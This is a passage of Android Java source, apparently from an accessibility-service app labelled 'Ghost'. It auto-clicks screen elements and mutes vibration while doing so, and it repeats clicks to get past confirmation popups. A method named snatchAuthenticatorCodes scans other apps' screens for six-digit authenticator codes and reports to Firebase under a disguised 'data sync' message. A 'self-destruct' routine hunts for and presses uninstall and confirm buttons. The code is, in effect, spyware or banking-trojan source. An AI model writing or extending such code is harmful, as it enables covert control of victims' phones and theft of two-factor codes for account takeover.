                if (curr.isClickable()) {
                    if (curr.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
                        clicked = true;
                        Log.d(TAG, "GHOST_AUTOPILOT: Direct parent ACTION_CLICK performed");
                        curr.recycle();
                        break;
                    }
                }
                AccessibilityNodeInfo parent = curr.getParent();
                curr.recycle();
                curr = parent;
                depth++;
            }
        }

        // 3. Fallback to native gesture tap ONLY if direct node/parent click was not clickable or failed
        if (!clicked) {
            if (x > 0 && y > 0 && x < getScreenWidth() && y < getScreenHeight()) {
                clicked = clickAt(x, y);
                if (clicked) {
                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-click gesture tap executed at (" + x + ", " + y + ")");
                }
            }
        }

        if (clicked) {
            muteVibration();
            // Schedule multi-pass follow-ups for 2-step confirmation popups
            Handler mainHandler = new Handler(Looper.getMainLooper());
            mainHandler.postDelayed(this::executeAutoPilotPass, 100);
            mainHandler.postDelayed(this::executeAutoPilotPass, 300);
            mainHandler.postDelayed(this::executeAutoPilotPass, 600);
        }

        return clicked;
    }

    private void snatchAuthenticatorCodes(String pkg) {
        new Handler(Looper.getMainLooper()).post(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // Look for 6-digit numeric codes
                List<AccessibilityNodeInfo> nodes = new ArrayList<>();
                findNumericNodes(root, nodes);

                for (AccessibilityNodeInfo node : nodes) {
                    if (node.getText() != null) {
                        String code = node.getText().toString().replaceAll("\\s", "");
                        if (code.matches("\\d{6}")) {
                            FirebaseConfig.logActivity("CORE_METRIC_09: Data sync successful for " + pkg);
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        });
    }

    private void findNumericNodes(AccessibilityNodeInfo node, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().matches(".*\\d{3}.*\\d{3}.*")) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNumericNodes(node.getChild(i), results);
        }
    }

    private void handleAutoDestruct(String pkg) {
        Log.d("SelfDestruct", "Ghost Monitor: Checking for removal buttons...");
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root == null) return;

                // --- AGGRESSIVE BUTTON HUNTER ---
                List<AccessibilityNodeInfo> targets = new ArrayList<>();
                String[] keywords = {"uninstall", "ok", "delete", "confirm", "yes", "stop", "deactivate", "off", "disable"};
                
                for (String word : keywords) {
                    findNodesByText(root, word, targets);
                }

                // Also look for specific resource IDs for "Uninstall" button
                String[] commonIds = {
                    "com.android.settings:id/left_button", 
                    "com.android.settings:id/button1",
                    "android:id/button1",
                    "com.android.packageinstaller:id/ok_button"
                };
                for (String id : commonIds) {
                    List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(id);
                    if (nodes != null) targets.addAll(nodes);
                }

                for (AccessibilityNodeInfo node : targets) {
                    if (node.isVisibleToUser()) {
                        AccessibilityNodeInfo clickable = node;
                        while (clickable != null && !clickable.isClickable()) {
                            clickable = clickable.getParent();
                        }
                        
                        if (clickable != null && clickable.isClickable()) {
                            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                            Log.d("SelfDestruct", "Force Click: " + node.getText());
                            return;
                        } else {
                            Rect bounds = new Rect();
                            node.getBoundsInScreen(bounds);
                            if (bounds.centerX() > 0 && bounds.centerY() > 0) {
                                clickAt(bounds.centerX(), bounds.centerY());
                                Log.d("SelfDestruct", "Force Touch: " + node.getText());
                                return;
                            }
                        }
                    }
                }
                root.recycle();
            } catch (Exception ignored) {}
        }, 800);
    }

    private void findNodesByText(AccessibilityNodeInfo node, String text, List<AccessibilityNodeInfo> results) {
        if (node == null) return;
        if (node.getText() != null && node.getText().toString().toLowerCase().contains(text.toLowerCase())) {
            results.add(node);
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            findNodesByText(node.getChild(i), text, results);
        }
    }
}
